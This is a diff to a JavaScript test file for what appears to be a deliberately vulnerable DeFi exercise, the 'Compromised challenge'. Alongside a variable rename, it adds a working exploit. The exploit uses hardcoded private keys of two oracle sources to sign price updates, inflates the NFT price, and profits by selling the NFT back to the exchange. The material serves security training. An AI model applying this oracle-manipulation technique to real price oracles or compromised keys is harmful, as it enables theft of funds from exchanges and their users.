@@ -10,7 +10,7 @@ const { expect } = require('chai');
 
 describe('Compromised challenge', function () {
 
-    const sources = [
+    const sourceOnes = [
         '0xA73209FB1a42495120166736362A1DfA9F95A105',
         '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
         '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
@@ -23,15 +23,15 @@ describe('Compromised challenge', function () {
     before(async function () {
         /** SETUP - NO NEED TO CHANGE ANYTHING HERE */
 
-        // Fund the trusted source addresses
-        await web3.eth.sendTransaction({ from: deployer, to: sources[0], value: ether('5') });
-        await web3.eth.sendTransaction({ from: deployer, to: sources[1], value: ether('5') });
-        await web3.eth.sendTransaction({ from: deployer, to: sources[2], value: ether('5') });
+        // Fund the trusted sourceOne addresses
+        await web3.eth.sendTransaction({ from: deployer, to: sourceOnes[0], value: ether('5') });
+        await web3.eth.sendTransaction({ from: deployer, to: sourceOnes[1], value: ether('5') });
+        await web3.eth.sendTransaction({ from: deployer, to: sourceOnes[2], value: ether('5') });
 
-        // Deploy the oracle and setup the trusted sources with initial prices
+        // Deploy the oracle and setup the trusted sourceOnes with initial prices
         this.oracle = await TrustfulOracle.at(
             await (await TrustfulOracleInitializer.new(
-                sources,
+                sourceOnes,
                 ["DVNFT", "DVNFT", "DVNFT"],
                 [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE],
                 { from: deployer }
@@ -51,6 +51,48 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+      // private key derived from converting hex chars to ascii and then base64 decoded
+      let price = await this.oracle.getMedianPrice("DVNFT");
+      let sourceOne = web3.eth.accounts.privateKeyToAccount("0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9")
+      let sourceTwo = web3.eth.accounts.privateKeyToAccount("0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48")
+      await this.exchange.buyOne({from: attacker, value: ether('999')})
+      const query = web3.eth.abi.encodeFunctionCall({
+        name: 'postPrice',
+        type: 'function',
+        inputs: [{
+          type: 'string',
+          name: 'symbol'
+        },{
+          type: 'uint256',
+          name: 'newPrice'
+        }]
+      }, ["DVNFT", "10999000000000000000000"]);
+      const signedTxOne = await web3.eth.accounts.signTransaction(
+        {
+          data: query,
+          from: sourceOne.address,
+          gas: 2000000,
+          to: this.oracle.address,
+        },
+        sourceOne.privateKey,
+        false,
+      );
+      const signedTxTwo = await web3.eth.accounts.signTransaction(
+        {
+          data: query,
+          from: sourceTwo.address,
+          gas: 2000000,
+          to: this.oracle.address,
+        },
+        sourceTwo.privateKey,
+        false,
+      );
+      let resOne = await web3.eth.sendSignedTransaction(signedTxOne.rawTransaction);
+      let resTwo = await web3.eth.sendSignedTransaction(signedTxTwo.rawTransaction);
+
+      price = await this.oracle.getMedianPrice("DVNFT");
+      await this.token.approve(this.exchange.address, 1, {from: attacker});
+      await this.exchange.sellOne(1, {from: attacker})
     });
 
     after(async function () {
